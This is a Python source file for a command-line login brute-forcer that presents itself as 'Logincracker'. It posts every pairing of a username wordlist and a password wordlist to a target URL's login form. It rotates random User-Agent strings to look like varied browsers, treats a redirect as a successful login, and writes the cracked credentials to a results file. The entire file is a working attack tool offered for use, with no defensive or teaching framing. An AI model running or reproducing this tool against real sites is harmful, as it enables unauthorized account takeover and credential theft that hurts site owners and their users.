import requests, time, random, sys, colorama
from colorama import Fore
colorama.init()
counter = 0
found = []
speed = []
start_program = True
def banner():
    print(f"""{Fore.GREEN}
     _                 _                           _             
    | |               (_)                         | |            
    | |     ___   __ _ _ _ __   ___ _ __ __ _  ___| | _____ _ __ 
    | |    / _ \ / _` | | '_ \ / __| '__/ _` |/ __| |/ / _ \ '__|
    | |___| (_) | (_| | | | | | (__| | | (_| | (__|   <  __/ |   
    |______\___/ \__, |_|_| |_|\___|_|  \__,_|\___|_|\_\___|_|   
                  __/ |          [by LukeProducts]                                
                 |___/       [© Copyright by LukeProducts]                                
    {Fore.RESET}""")
def help():
    print("usage:\npython gather_login.py [URL] [usernameindex] [passwordindex]")
try:
    with open("lib/Agent/useragents.txt") as f:
        agents_list = f.read().split('\n')
except:
    print("Directory 'lib/Agent/useragents.txt' missing")
    start_program = False
try:
    with open("lib/wordlists/usernames.txt") as f:
        username_list = f.read().split('\n')
        if username_list == []:
            print("cannot process no user")
            start_program = False
except:
    print("Directory 'lib/wordlists/usernames.txt' missing")
    start_program = False
try:
    with open("lib/wordlists/passwds.txt") as f:
        passwd_list = f.read().split('\n')
        if passwd_list == []:
            print("cannot process no pwd")
            start_program = False
except:
    print("Directory 'lib/wordlists/passwds.txt' mising")
    start_program = False
try:
    url = sys.argv[1]
    usrind = sys.argv[2]
    passwdind = sys.argv[3]
    try:
        requests.get(url)
    except:
        print("Bad URL given")
        start_program = False
except:
    try:
        if sys.argv[1] == "-h":
            help()
    except:
        pass
    print("Not enough args given.\naborting...")
    start_program = False

def save_cracked(adrr, usrind, passwdind, usr, passwd):
    try:
        with open("lib/Results/cracked.txt", "x") as f:
            content = f"addr: {adrr}; {usrind}:{usr}; {passwdind}:{passwd}\n"
            f.write(content)
    except:
        with open("lib/Results/cracked.txt", 'a') as f:
            content = f"addr: {adrr}; {usrind}:{usr}; {passwdind}:{passwd}\n"
            f.write(content)

def attack(url, usrind, passwdind, usr, passwd):
    a_time = time.time()
    global counter, agents_list, found
    data = {usrind: usr, passwdind: passwd}
    header = {"User-Agent": random.choice(agents_list)}
    try:
        r = requests.post(url, headers=header, data=data)
        if r.url != url:
            print(f"{Fore.LIGHTCYAN_EX}*-----KEY FOUND!-----*")
            print(f"User:{username}, Passwd:{passwd}")
            print(f"*-----KEY FOUND!-----*\n{Fore.RESET}")
            save_cracked(url, usrind, passwdind, usr, passwd)
            found.append(data)
        counter += 1
        b_time  = time.time()
        speed.append(int(1/(b_time-a_time)))
        return True
    except:
        return False
if start_program:
    banner()
    print(f"{Fore.RED}processing... [the duration depends on the keys you've given and complexity of the website]\n{Fore.RESET}")
    start = time.time()
    for username in username_list:
        for passwd in passwd_list:
            while not attack(url, usrind, passwdind, username, passwd):
                continue
            continue
    end = time.time()
    print(f"Process finished with {counter} tried combination/s with a total session time of {int(end-start)} secs and {len(found)} good combination/s found!")
    print(f"******************- speed of {sum(speed)/(len(speed) - 1)} keys / sec -******************")
    print("******************- [error retries not included] -******************")
    print("Result/s saved to /libs/Results/cracked.txt")

